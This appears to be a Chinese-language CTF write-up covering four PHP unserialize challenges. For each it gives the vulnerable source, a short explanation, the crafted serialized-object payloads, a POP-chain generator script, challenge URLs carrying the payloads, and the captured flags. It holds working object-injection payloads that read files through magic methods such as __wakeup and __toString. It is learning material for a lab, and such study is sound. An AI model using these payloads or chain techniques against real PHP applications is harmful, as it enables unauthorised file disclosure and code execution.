<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end time -->

</details>

<a id="case-unserialize"></a>

## PHP 魔术方法与对象状态

原题包含多套源代码、序列化对象和输入样例。四个变体分别保留，便于对照属性可见性、魔术方法和对象执行顺序。

<p class="kb-provenance">来源 unserialize · 原记录 2020-09-17 · 12 个代码块 · 0 处图片引用</p>

<details class="kb-evidence" id="record-unserialize">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start unserialize -->

#### serialize01

源码：

``` bash
<?php

class A{
    public $classname;
    function __toString(){
        echo file_get_contents($this->classname);
        return "";
    }
}

echo unserialize($_GET['a']);
highlight_file(__FILE__);

?>
```



writeup:

``` bash
A类中有魔幻函数，index.php中unserialize函数参数可控
构造payload： O:1:"A":1:{s:9:"classname";s:8:"flag.php";}，反序列化之后，有一个classname变量，内容为flag.php。当index.php执行echo操作时，会自动触发A类中的__tostring()函数，然后通过echo file_get_contents($this->file)输出flag.php里面的内容
```

payload and flag:

``` bash
http://8e023c5a6336fedd.synctf.com:8002/serialize/serialize01/index.php?a=O:1:"A":1:{s:9:"classname";s:8:"flag.php";}

<?php
$flag = "SYNCTF{SJshNZJ_Hasjcxzm}";
?>
```

#### serialize02

源码：

``` bash
<?php

class A{
    public $classname;
    function __wakeup(){
        echo file_get_contents($this->classname);
        return "";
    }
}

unserialize($_GET['a']);
highlight_file(__FILE__);

?>
```

writeup:

``` bash
flag在flag.php里面

A类中有魔幻函数，index.php中unserialize函数参数可控

构造payload： O:1:"A":1:{s:9:"classname";s:8:"flag.php";}，反序列化之后，有一个classname变量，内容为flag.php。当index.php执行echo操作时，会自动触发A类中的__wakeup()函数，然后通过echo file_get_contents($this->file)输出flag.php里面的内容
```

payload and flag:

``` bash
http://8e023c5a6336fedd.synctf.com:8002/serialize/serialize02/index.php?a=O:1:%22A%22:1:{s:9:%22classname%22;s:8:%22flag.php%22;}

<?php
$flag = "SYNCTF{QPlMXHams_smAHSAJ}";
?>
```

#### serialize03

源码：

``` bash
<?php

class A{
    public $classname;
    function __wakeup(){
        unserialize($this->classname);
        return '';
    }
}
class B{
    private $filename;
    function __wakeup(){
        echo file_get_contents($this->filename);
        return '';
    }
}

unserialize($_GET['a']);
highlight_file(__FILE__);

?>
```

writeup:

``` bash
反序列化利用代码:
echo serialize(new A);
echo serialize(new B);

说明:

flag在flag.php里面

因为private是类名B两边都有%00所以同样在url上面体现
```

payload and flag:

``` bash
payload: O:1:"A":1:{s:9:"classname";O:1:"B":1:{s:11:"%00B%00filename";s:8:"flag.php";};}

<?php
$flag = "SYNCTF{JSasjd_HJshhsh}";
?>
```

#### serialize05

源码：

``` bash
<?php
class start_gg
{
        public $mod1;
        public $mod2;
        public function __destruct()
        {
                $this->mod1->test1();
        }
}
class Call
{
        public $mod1;
        public $mod2;
        public function test1()
    {
            $this->mod1->test2();
    }
}
class funct
{
        public $mod1;
        public $mod2;
        public function __call($test2,$arr)
        {
                $s1 = $this->mod1;
                $s1();
        }
}
class func
{
        public $mod1;
        public $mod2;
        public function __invoke()
        {
                $this->mod2 = "字符串拼接".$this->mod1;
        } 
}
class string1
{
        public $str1;
        public $str2;
        public function __toString()
        {
                $this->str1->get_flag();
                return "1";
        }
}
class GetFlag
{
        public function get_flag()
        {
                echo "flag:"."xxxxxxxxxxxx";
        }
}
$a = $_GET['string'];
unserialize($a);
?>
```

writeup:

``` bash
根据一层一层的关系写入来构造payload的代码,POP链构造：

<?php
class start_gg
{
        public $mod1;
        public $mod2;
        public function __construct()
        {
                $this->mod1 = new Call();
        }
        public function __destruct()
        {
                $this->mod1->test1();
        }
}
class Call
{
    public $mod1;
    public $mod2;
    public function __construct()
    {
            $this->mod1 = new funct();
    }
    public function test1()
    {
            $this->mod1->test2();
    }
}
class funct
{
        public $mod1;
        public $mod2;
        public function __construct()
        {
                $this->mod1 = new func();
        }
        public function __call($test2,$arr)
        {
                $s1 = $this->mod1;
                $s1();
        }
}
class func
{
        public $mod1;
        public $mod2;
        public function __construct()
        {
        	$this->mod1=new string1();
        }
        public function __invoke()
        {
                $this->mod2 = "字符串拼接".$this->mod1;
        }
}
class string1
{
        public $str1;
        public $str2;
        public function __construct()
        {
        	$this->str1=new GetFlag();
        }
        public function __toString()
        {
                $this->str1->get_flag();
                return "1";
        }
}
class GetFlag
{
        public function get_flag()
        {
                echo "flag:"."xxxxxxxxxxxx";
        }
}
$a = new start_gg();
echo serialize($a);
?>
```

payload and flag:

``` bash
O:8:"start_gg":2:{s:4:"mod1";O:4:"Call":2:{s:4:"mod1";O:5:"funct":2:{s:4:"mod1";O:4:"func":2:{s:4:"mod1";O:7:"string1":2:{s:4:"str1";O:7:"GetFlag":0:{}s:4:"str2";N;}s:4:"mod2";N;}s:4:"mod2";N;}s:4:"mod2";N;}s:4:"mod2";N;}


SYNCTF{mlaALQ_KMjmajsd}
```

<!-- kb:end unserialize -->

</details>

